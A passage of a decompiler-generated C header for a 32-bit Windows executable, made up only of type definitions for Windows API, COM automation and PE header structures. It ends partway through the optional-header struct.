typedef unsigned char   undefined;

typedef pointer32 ImageBaseOffset32;

typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef unsigned short    wchar16;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _GUID _GUID, *P_GUID;

typedef struct _GUID GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef GUID IID;

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

typedef void *HANDLE;

typedef ulong DWORD;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef uchar BYTE;

typedef BYTE *LPBYTE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef wchar_t WCHAR;

typedef WCHAR *LPWSTR;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _MEMORY_BASIC_INFORMATION _MEMORY_BASIC_INFORMATION, *P_MEMORY_BASIC_INFORMATION;

typedef ULONG_PTR SIZE_T;

struct _MEMORY_BASIC_INFORMATION {
    PVOID BaseAddress;
    PVOID AllocationBase;
    DWORD AllocationProtect;
    SIZE_T RegionSize;
    DWORD State;
    DWORD Protect;
    DWORD Type;
};

typedef PVOID PSECURITY_DESCRIPTOR;

typedef struct _ACL _ACL, *P_ACL;

struct _ACL {
    BYTE AclRevision;
    BYTE Sbz1;
    WORD AclSize;
    WORD AceCount;
    WORD Sbz2;
};

typedef double ULONGLONG;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

typedef long LONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _TOKEN_PRIVILEGES _TOKEN_PRIVILEGES, *P_TOKEN_PRIVILEGES;

typedef struct _LUID_AND_ATTRIBUTES _LUID_AND_ATTRIBUTES, *P_LUID_AND_ATTRIBUTES;

typedef struct _LUID_AND_ATTRIBUTES LUID_AND_ATTRIBUTES;

typedef struct _LUID _LUID, *P_LUID;

typedef struct _LUID LUID;

struct _LUID {
    DWORD LowPart;
    LONG HighPart;
};

struct _LUID_AND_ATTRIBUTES {
    LUID Luid;
    DWORD Attributes;
};

struct _TOKEN_PRIVILEGES {
    DWORD PrivilegeCount;
    LUID_AND_ATTRIBUTES Privileges[1];
};

typedef struct _ACL ACL;

typedef ACL *PACL;

typedef DWORD SECURITY_INFORMATION;

typedef WCHAR *LPCWSTR;

typedef struct _LUID *PLUID;

typedef long HRESULT;

typedef CHAR *LPCSTR;

typedef struct _MEMORY_BASIC_INFORMATION *PMEMORY_BASIC_INFORMATION;

typedef LONG *PLONG;

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef enum _TOKEN_INFORMATION_CLASS {
    TokenUser=1,
    TokenGroups=2,
    TokenPrivileges=3,
    TokenOwner=4,
    TokenPrimaryGroup=5,
    TokenDefaultDacl=6,
    TokenSource=7,
    TokenType=8,
    TokenImpersonationLevel=9,
    TokenStatistics=10,
    TokenRestrictedSids=11,
    TokenSessionId=12,
    TokenGroupsAndPrivileges=13,
    TokenSessionReference=14,
    TokenSandBoxInert=15,
    TokenAuditPolicy=16,
    TokenOrigin=17,
    TokenElevationType=18,
    TokenLinkedToken=19,
    TokenElevation=20,
    TokenHasRestrictions=21,
    TokenAccessInformation=22,
    TokenVirtualizationAllowed=23,
    TokenVirtualizationEnabled=24,
    TokenIntegrityLevel=25,
    TokenUIAccess=26,
    TokenMandatoryPolicy=27,
    TokenLogonSid=28,
    MaxTokenInfoClass=29
} _TOKEN_INFORMATION_CLASS;

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef struct _OSVERSIONINFOA *LPOSVERSIONINFOA;

typedef struct _TOKEN_PRIVILEGES *PTOKEN_PRIVILEGES;

typedef short SHORT;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef PVOID PSID;

typedef enum _TOKEN_INFORMATION_CLASS TOKEN_INFORMATION_CLASS;

typedef HANDLE *PHANDLE;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef struct tagFUNCDESC tagFUNCDESC, *PtagFUNCDESC;

typedef LONG DISPID;

typedef DISPID MEMBERID;

typedef LONG SCODE;

typedef struct tagELEMDESC tagELEMDESC, *PtagELEMDESC;

typedef struct tagELEMDESC ELEMDESC;

typedef enum tagFUNCKIND {
    FUNC_VIRTUAL=0,
    FUNC_PUREVIRTUAL=1,
    FUNC_NONVIRTUAL=2,
    FUNC_STATIC=3,
    FUNC_DISPATCH=4
} tagFUNCKIND;

typedef enum tagFUNCKIND FUNCKIND;

typedef enum tagINVOKEKIND {
    INVOKE_FUNC=1,
    INVOKE_PROPERTYGET=2,
    INVOKE_PROPERTYPUT=4,
    INVOKE_PROPERTYPUTREF=8
} tagINVOKEKIND;

typedef enum tagINVOKEKIND INVOKEKIND;

typedef enum tagCALLCONV {
    CC_FASTCALL=0,
    CC_CDECL=1,
    CC_MSCPASCAL=2,
    CC_PASCAL=3,
    CC_MACPASCAL=4,
    CC_STDCALL=5,
    CC_FPFASTCALL=6,
    CC_SYSCALL=7,
    CC_MPWCDECL=8,
    CC_MPWPASCAL=9,
    CC_MAX=10
} tagCALLCONV;

typedef enum tagCALLCONV CALLCONV;

typedef struct tagTYPEDESC tagTYPEDESC, *PtagTYPEDESC;

typedef struct tagTYPEDESC TYPEDESC;

typedef union _union_2702 _union_2702, *P_union_2702;

typedef union _union_2691 _union_2691, *P_union_2691;

typedef ushort VARTYPE;

typedef struct tagIDLDESC tagIDLDESC, *PtagIDLDESC;

typedef struct tagIDLDESC IDLDESC;

typedef struct tagPARAMDESC tagPARAMDESC, *PtagPARAMDESC;

typedef struct tagPARAMDESC PARAMDESC;

typedef struct tagARRAYDESC tagARRAYDESC, *PtagARRAYDESC;

typedef DWORD HREFTYPE;

typedef ushort USHORT;

typedef struct tagPARAMDESCEX tagPARAMDESCEX, *PtagPARAMDESCEX;

typedef struct tagPARAMDESCEX *LPPARAMDESCEX;

typedef struct tagSAFEARRAYBOUND tagSAFEARRAYBOUND, *PtagSAFEARRAYBOUND;

typedef struct tagSAFEARRAYBOUND SAFEARRAYBOUND;

typedef DWORD ULONG;

typedef struct tagVARIANT tagVARIANT, *PtagVARIANT;

typedef struct tagVARIANT VARIANT;

typedef VARIANT VARIANTARG;

typedef union _union_2683 _union_2683, *P_union_2683;

typedef struct __tagVARIANT __tagVARIANT, *P__tagVARIANT;

typedef struct tagDEC tagDEC, *PtagDEC;

typedef struct tagDEC DECIMAL;

typedef union _union_2685 _union_2685, *P_union_2685;

typedef union _union_1695 _union_1695, *P_union_1695;

typedef union _union_1697 _union_1697, *P_union_1697;

typedef float FLOAT;

typedef double DOUBLE;

typedef short VARIANT_BOOL;

typedef union tagCY tagCY, *PtagCY;

typedef union tagCY CY;

typedef double DATE;

typedef WCHAR OLECHAR;

typedef OLECHAR *BSTR;

typedef struct IUnknown IUnknown, *PIUnknown;

typedef struct IDispatch IDispatch, *PIDispatch;

typedef struct tagSAFEARRAY tagSAFEARRAY, *PtagSAFEARRAY;

typedef struct tagSAFEARRAY SAFEARRAY;

typedef int INT;

typedef uint UINT;

typedef struct __tagBRECORD __tagBRECORD, *P__tagBRECORD;

typedef struct _struct_1696 _struct_1696, *P_struct_1696;

typedef struct _struct_1698 _struct_1698, *P_struct_1698;

typedef struct _struct_1693 _struct_1693, *P_struct_1693;

typedef struct IUnknownVtbl IUnknownVtbl, *PIUnknownVtbl;

typedef struct IDispatchVtbl IDispatchVtbl, *PIDispatchVtbl;

typedef struct ITypeInfo ITypeInfo, *PITypeInfo;

typedef OLECHAR *LPOLESTR;

typedef struct tagDISPPARAMS tagDISPPARAMS, *PtagDISPPARAMS;

typedef struct tagDISPPARAMS DISPPARAMS;

typedef struct tagEXCEPINFO tagEXCEPINFO, *PtagEXCEPINFO;

typedef struct tagEXCEPINFO EXCEPINFO;

typedef struct IRecordInfo IRecordInfo, *PIRecordInfo;

typedef struct ITypeInfoVtbl ITypeInfoVtbl, *PITypeInfoVtbl;

typedef struct tagTYPEATTR tagTYPEATTR, *PtagTYPEATTR;

typedef struct tagTYPEATTR TYPEATTR;

typedef struct ITypeComp ITypeComp, *PITypeComp;

typedef struct tagFUNCDESC FUNCDESC;

typedef struct tagVARDESC tagVARDESC, *PtagVARDESC;

typedef struct tagVARDESC VARDESC;

typedef struct ITypeLib ITypeLib, *PITypeLib;

typedef struct IRecordInfoVtbl IRecordInfoVtbl, *PIRecordInfoVtbl;

typedef OLECHAR *LPCOLESTR;

typedef enum tagTYPEKIND {
    TKIND_ENUM=0,
    TKIND_RECORD=1,
    TKIND_MODULE=2,
    TKIND_INTERFACE=3,
    TKIND_DISPATCH=4,
    TKIND_COCLASS=5,
    TKIND_ALIAS=6,
    TKIND_UNION=7,
    TKIND_MAX=8
} tagTYPEKIND;

typedef enum tagTYPEKIND TYPEKIND;

typedef struct ITypeCompVtbl ITypeCompVtbl, *PITypeCompVtbl;

typedef enum tagDESCKIND {
    DESCKIND_NONE=0,
    DESCKIND_FUNCDESC=1,
    DESCKIND_VARDESC=2,
    DESCKIND_TYPECOMP=3,
    DESCKIND_IMPLICITAPPOBJ=4,
    DESCKIND_MAX=5
} tagDESCKIND;

typedef enum tagDESCKIND DESCKIND;

typedef union tagBINDPTR tagBINDPTR, *PtagBINDPTR;

typedef union tagBINDPTR BINDPTR;

typedef union _union_2711 _union_2711, *P_union_2711;

typedef enum tagVARKIND {
    VAR_PERINSTANCE=0,
    VAR_STATIC=1,
    VAR_CONST=2,
    VAR_DISPATCH=3
} tagVARKIND;

typedef enum tagVARKIND VARKIND;

typedef struct ITypeLibVtbl ITypeLibVtbl, *PITypeLibVtbl;

typedef struct tagTLIBATTR tagTLIBATTR, *PtagTLIBATTR;

typedef struct tagTLIBATTR TLIBATTR;

typedef enum tagSYSKIND {
    SYS_WIN16=0,
    SYS_WIN32=1,
    SYS_MAC=2,
    SYS_WIN64=3
} tagSYSKIND;

typedef enum tagSYSKIND SYSKIND;

struct _struct_1693 {
    ulong Lo;
    long Hi;
};

union tagCY {
    struct _struct_1693 s;
    LONGLONG int64;
};

struct _struct_1698 {
    ULONG Lo32;
    ULONG Mid32;
};

union _union_1697 {
    struct _struct_1698 s2;
    ULONGLONG Lo64;
};

struct _struct_1696 {
    BYTE scale;
    BYTE sign;
};

union _union_1695 {
    struct _struct_1696 s;
    USHORT signscale;
};

struct tagDEC {
    USHORT wReserved;
    union _union_1695 u;
    ULONG Hi32;
    union _union_1697 u2;
};

struct __tagBRECORD {
    PVOID pvRecord;
    struct IRecordInfo *pRecInfo;
};

union _union_2685 {
    LONGLONG llVal;
    LONG lVal;
    BYTE bVal;
    SHORT iVal;
    FLOAT fltVal;
    DOUBLE dblVal;
    VARIANT_BOOL boolVal;
    SCODE scode;
    CY cyVal;
    DATE date;
    BSTR bstrVal;
    struct IUnknown *punkVal;
    struct IDispatch *pdispVal;
    SAFEARRAY *parray;
    BYTE *pbVal;
    SHORT *piVal;
    LONG *plVal;
    LONGLONG *pllVal;
    FLOAT *pfltVal;
    DOUBLE *pdblVal;
    VARIANT_BOOL *pboolVal;
    SCODE *pscode;
    CY *pcyVal;
    DATE *pdate;
    BSTR *pbstrVal;
    struct IUnknown **ppunkVal;
    struct IDispatch **ppdispVal;
    SAFEARRAY **pparray;
    VARIANT *pvarVal;
    PVOID byref;
    CHAR cVal;
    USHORT uiVal;
    ULONG ulVal;
    ULONGLONG ullVal;
    INT intVal;
    UINT uintVal;
    DECIMAL *pdecVal;
    CHAR *pcVal;
    USHORT *puiVal;
    ULONG *pulVal;
    ULONGLONG *pullVal;
    INT *pintVal;
    UINT *puintVal;
    struct __tagBRECORD brecVal;
};

struct __tagVARIANT {
    VARTYPE vt;
    WORD wReserved1;
    WORD wReserved2;
    WORD wReserved3;
    union _union_2685 n3;
};

union _union_2683 {
    struct __tagVARIANT n2;
    DECIMAL decVal;
};

union _union_2691 {
    struct tagTYPEDESC *lptdesc;
    struct tagARRAYDESC *lpadesc;
    HREFTYPE hreftype;
};

struct tagTYPEDESC {
    union _union_2691 u;
    VARTYPE vt;
};

struct tagIDLDESC {
    ULONG_PTR dwReserved;
    USHORT wIDLFlags;
};

struct tagPARAMDESC {
    LPPARAMDESCEX pparamdescex;
    USHORT wParamFlags;
};

union _union_2702 {
    IDLDESC idldesc;
    PARAMDESC paramdesc;
};

struct tagELEMDESC {
    TYPEDESC tdesc;
    union _union_2702 u;
};

struct tagFUNCDESC {
    MEMBERID memid;
    SCODE *lprgscode;
    ELEMDESC *lprgelemdescParam;
    FUNCKIND funckind;
    INVOKEKIND invkind;
    CALLCONV callconv;
    SHORT cParams;
    SHORT cParamsOpt;
    SHORT oVft;
    SHORT cScodes;
    ELEMDESC elemdescFunc;
    WORD wFuncFlags;
};

struct tagVARIANT {
    union _union_2683 n1;
};

struct tagPARAMDESCEX {
    ULONG cBytes;
    VARIANTARG varDefaultValue;
};

union _union_2711 {
    ULONG oInst;
    VARIANT *lpvarValue;
};

struct tagVARDESC {
    MEMBERID memid;
    LPOLESTR lpstrSchema;
    union _union_2711 u;
    ELEMDESC elemdescVar;
    WORD wVarFlags;
    VARKIND varkind;
};

struct ITypeCompVtbl {
    HRESULT (*QueryInterface)(struct ITypeComp *, IID *, void **);
    ULONG (*AddRef)(struct ITypeComp *);
    ULONG (*Release)(struct ITypeComp *);
    HRESULT (*Bind)(struct ITypeComp *, LPOLESTR, ULONG, WORD, struct ITypeInfo **, DESCKIND *, BINDPTR *);
    HRESULT (*BindType)(struct ITypeComp *, LPOLESTR, ULONG, struct ITypeInfo **, struct ITypeComp **);
};

struct tagSAFEARRAYBOUND {
    ULONG cElements;
    LONG lLbound;
};

struct tagSAFEARRAY {
    USHORT cDims;
    USHORT fFeatures;
    ULONG cbElements;
    ULONG cLocks;
    PVOID pvData;
    SAFEARRAYBOUND rgsabound[1];
};

struct ITypeInfoVtbl {
    HRESULT (*QueryInterface)(struct ITypeInfo *, IID *, void **);
    ULONG (*AddRef)(struct ITypeInfo *);
    ULONG (*Release)(struct ITypeInfo *);
    HRESULT (*GetTypeAttr)(struct ITypeInfo *, TYPEATTR **);
    HRESULT (*GetTypeComp)(struct ITypeInfo *, struct ITypeComp **);
    HRESULT (*GetFuncDesc)(struct ITypeInfo *, UINT, FUNCDESC **);
    HRESULT (*GetVarDesc)(struct ITypeInfo *, UINT, VARDESC **);
    HRESULT (*GetNames)(struct ITypeInfo *, MEMBERID, BSTR *, UINT, UINT *);
    HRESULT (*GetRefTypeOfImplType)(struct ITypeInfo *, UINT, HREFTYPE *);
    HRESULT (*GetImplTypeFlags)(struct ITypeInfo *, UINT, INT *);
    HRESULT (*GetIDsOfNames)(struct ITypeInfo *, LPOLESTR *, UINT, MEMBERID *);
    HRESULT (*Invoke)(struct ITypeInfo *, PVOID, MEMBERID, WORD, DISPPARAMS *, VARIANT *, EXCEPINFO *, UINT *);
    HRESULT (*GetDocumentation)(struct ITypeInfo *, MEMBERID, BSTR *, BSTR *, DWORD *, BSTR *);
    HRESULT (*GetDllEntry)(struct ITypeInfo *, MEMBERID, INVOKEKIND, BSTR *, BSTR *, WORD *);
    HRESULT (*GetRefTypeInfo)(struct ITypeInfo *, HREFTYPE, struct ITypeInfo **);
    HRESULT (*AddressOfMember)(struct ITypeInfo *, MEMBERID, INVOKEKIND, PVOID *);
    HRESULT (*CreateInstance)(struct ITypeInfo *, struct IUnknown *, IID *, PVOID *);
    HRESULT (*GetMops)(struct ITypeInfo *, MEMBERID, BSTR *);
    HRESULT (*GetContainingTypeLib)(struct ITypeInfo *, struct ITypeLib **, UINT *);
    void (*ReleaseTypeAttr)(struct ITypeInfo *, TYPEATTR *);
    void (*ReleaseFuncDesc)(struct ITypeInfo *, FUNCDESC *);
    void (*ReleaseVarDesc)(struct ITypeInfo *, VARDESC *);
};

struct ITypeLibVtbl {
    HRESULT (*QueryInterface)(struct ITypeLib *, IID *, void **);
    ULONG (*AddRef)(struct ITypeLib *);
    ULONG (*Release)(struct ITypeLib *);
    UINT (*GetTypeInfoCount)(struct ITypeLib *);
    HRESULT (*GetTypeInfo)(struct ITypeLib *, UINT, struct ITypeInfo **);
    HRESULT (*GetTypeInfoType)(struct ITypeLib *, UINT, TYPEKIND *);
    HRESULT (*GetTypeInfoOfGuid)(struct ITypeLib *, GUID *, struct ITypeInfo **);
    HRESULT (*GetLibAttr)(struct ITypeLib *, TLIBATTR **);
    HRESULT (*GetTypeComp)(struct ITypeLib *, struct ITypeComp **);
    HRESULT (*GetDocumentation)(struct ITypeLib *, INT, BSTR *, BSTR *, DWORD *, BSTR *);
    HRESULT (*IsName)(struct ITypeLib *, LPOLESTR, ULONG, BOOL *);
    HRESULT (*FindName)(struct ITypeLib *, LPOLESTR, ULONG, struct ITypeInfo **, MEMBERID *, USHORT *);
    void (*ReleaseTLibAttr)(struct ITypeLib *, TLIBATTR *);
};

struct tagTLIBATTR {
    GUID guid;
    LCID lcid;
    SYSKIND syskind;
    WORD wMajorVerNum;
    WORD wMinorVerNum;
    WORD wLibFlags;
};

struct tagARRAYDESC {
    TYPEDESC tdescElem;
    USHORT cDims;
    SAFEARRAYBOUND rgbounds[1];
};

struct ITypeComp {
    struct ITypeCompVtbl *lpVtbl;
};

struct IRecordInfo {
    struct IRecordInfoVtbl *lpVtbl;
};

struct tagTYPEATTR {
    GUID guid;
    LCID lcid;
    DWORD dwReserved;
    MEMBERID memidConstructor;
    MEMBERID memidDestructor;
    LPOLESTR lpstrSchema;
    ULONG cbSizeInstance;
    TYPEKIND typekind;
    WORD cFuncs;
    WORD cVars;
    WORD cImplTypes;
    WORD cbSizeVft;
    WORD cbAlignment;
    WORD wTypeFlags;
    WORD wMajorVerNum;
    WORD wMinorVerNum;
    TYPEDESC tdescAlias;
    IDLDESC idldescType;
};

struct IRecordInfoVtbl {
    HRESULT (*QueryInterface)(struct IRecordInfo *, IID *, void **);
    ULONG (*AddRef)(struct IRecordInfo *);
    ULONG (*Release)(struct IRecordInfo *);
    HRESULT (*RecordInit)(struct IRecordInfo *, PVOID);
    HRESULT (*RecordClear)(struct IRecordInfo *, PVOID);
    HRESULT (*RecordCopy)(struct IRecordInfo *, PVOID, PVOID);
    HRESULT (*GetGuid)(struct IRecordInfo *, GUID *);
    HRESULT (*GetName)(struct IRecordInfo *, BSTR *);
    HRESULT (*GetSize)(struct IRecordInfo *, ULONG *);
    HRESULT (*GetTypeInfo)(struct IRecordInfo *, struct ITypeInfo **);
    HRESULT (*GetField)(struct IRecordInfo *, PVOID, LPCOLESTR, VARIANT *);
    HRESULT (*GetFieldNoCopy)(struct IRecordInfo *, PVOID, LPCOLESTR, VARIANT *, PVOID *);
    HRESULT (*PutField)(struct IRecordInfo *, ULONG, PVOID, LPCOLESTR, VARIANT *);
    HRESULT (*PutFieldNoCopy)(struct IRecordInfo *, ULONG, PVOID, LPCOLESTR, VARIANT *);
    HRESULT (*GetFieldNames)(struct IRecordInfo *, ULONG *, BSTR *);
    BOOL (*IsMatchingType)(struct IRecordInfo *, struct IRecordInfo *);
    PVOID (*RecordCreate)(struct IRecordInfo *);
    HRESULT (*RecordCreateCopy)(struct IRecordInfo *, PVOID, PVOID *);
    HRESULT (*RecordDestroy)(struct IRecordInfo *, PVOID);
};

struct tagDISPPARAMS {
    VARIANTARG *rgvarg;
    DISPID *rgdispidNamedArgs;
    UINT cArgs;
    UINT cNamedArgs;
};

union tagBINDPTR {
    FUNCDESC *lpfuncdesc;
    VARDESC *lpvardesc;
    struct ITypeComp *lptcomp;
};

struct IDispatch {
    struct IDispatchVtbl *lpVtbl;
};

struct IUnknownVtbl {
    HRESULT (*QueryInterface)(struct IUnknown *, IID *, void **);
    ULONG (*AddRef)(struct IUnknown *);
    ULONG (*Release)(struct IUnknown *);
};

struct IDispatchVtbl {
    HRESULT (*QueryInterface)(struct IDispatch *, IID *, void **);
    ULONG (*AddRef)(struct IDispatch *);
    ULONG (*Release)(struct IDispatch *);
    HRESULT (*GetTypeInfoCount)(struct IDispatch *, UINT *);
    HRESULT (*GetTypeInfo)(struct IDispatch *, UINT, LCID, struct ITypeInfo **);
    HRESULT (*GetIDsOfNames)(struct IDispatch *, IID *, LPOLESTR *, UINT, LCID, DISPID *);
    HRESULT (*Invoke)(struct IDispatch *, DISPID, IID *, LCID, WORD, DISPPARAMS *, VARIANT *, EXCEPINFO *, UINT *);
};

struct IUnknown {
    struct IUnknownVtbl *lpVtbl;
};

struct ITypeLib {
    struct ITypeLibVtbl *lpVtbl;
};

struct ITypeInfo {
    struct ITypeInfoVtbl *lpVtbl;
};

struct tagEXCEPINFO {
    WORD wCode;
    WORD wReserved;
    BSTR bstrSource;
    BSTR bstrDescription;
    BSTR bstrHelpFile;
    DWORD dwHelpContext;
    PVOID pvReserved;
    HRESULT (*pfnDeferredFillIn)(struct tagEXCEPINFO *);
    SCODE scode;
};

typedef struct tagSOLE_AUTHENTICATION_SERVICE tagSOLE_AUTHENTICATION_SERVICE, *PtagSOLE_AUTHENTICATION_SERVICE;

typedef struct tagSOLE_AUTHENTICATION_SERVICE SOLE_AUTHENTICATION_SERVICE;

struct tagSOLE_AUTHENTICATION_SERVICE {
    DWORD dwAuthnSvc;
    DWORD dwAuthzSvc;
    OLECHAR *pPrincipalName;
    HRESULT hr;
};

typedef uint UINT_PTR;

typedef long LONG_PTR;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME *LPFILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef int (*FARPROC)(void);

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef UINT_PTR WPARAM;

typedef DWORD *LPDWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef WORD ATOM;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef DWORD *PDWORD;

typedef struct _FILETIME FILETIME;

typedef LONG_PTR LPARAM;

typedef BOOL *LPBOOL;

typedef void *LPCVOID;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

struct HWND__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
